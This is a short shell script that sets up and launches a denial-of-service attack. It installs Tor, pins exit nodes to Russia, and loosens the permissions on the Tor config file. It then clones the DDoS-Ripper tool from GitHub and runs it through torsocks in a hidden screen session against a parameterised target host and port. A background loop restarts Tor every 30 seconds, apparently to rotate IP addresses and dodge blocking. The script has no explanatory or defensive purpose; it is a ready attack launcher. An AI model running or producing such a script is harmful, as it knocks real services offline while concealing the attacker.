#!/bin/sh 
# --- Installing Common --- 
sudo apt update 
sudo apt install -y htop wget vim apache2-utils git 
# ---  Installing TOR   --- 
sudo apt update 
sudo apt install -y tor tor-geoipdb proxychains torsocks geoip-bin 
sudo chmod 466 /etc/tor/torrc
echo "ExitNodes {ru}">> /etc/tor/torrc 
echo "StrictNodes 1" >> /etc/tor/torrc 
sudo service tor start 
 
# Install DDoS-Ripper 
git clone https://github.com/palahsu/DDoS-Ripper.git 
cd /DDoS-Ripper 
sudo screen -d -m -S ${target} torsocks -P 9050 python3 DRipper.py -s ${target} -p ${port} -t ${turbo} -q ${quiet}
sudo screen -d -m bash -c 'bash --init-file <(while true; do sudo service tor restart; sleep 30; done)' 
